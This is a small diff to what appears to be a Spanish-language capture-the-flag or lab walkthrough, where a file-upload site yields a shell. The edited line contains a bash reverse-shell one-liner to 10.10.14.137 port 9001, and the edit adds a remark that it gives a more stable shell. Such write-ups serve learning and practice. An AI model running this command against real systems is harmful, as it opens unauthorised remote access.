@@ -136,7 +136,7 @@ encontramos una web que nos permite subir archivos en este caso imagenes
 
 
 
-aqui obtenemos una shell que nos permite intereactuar de manera mas facil con el sistema. y aprovechando este usaremos el comando `bash -c "bash -i >& /dev/tcp/10.10.14.137/9001 0>&1"`
+aqui obtenemos una shell que nos permite intereactuar de manera mas facil con el sistema. y aprovechando este usaremos el comando `bash -c "bash -i >& /dev/tcp/10.10.14.137/9001 0>&1"` para obtener una reverse shell mas estable
 ![[Pasted image 20240412232653.png]]
 
 
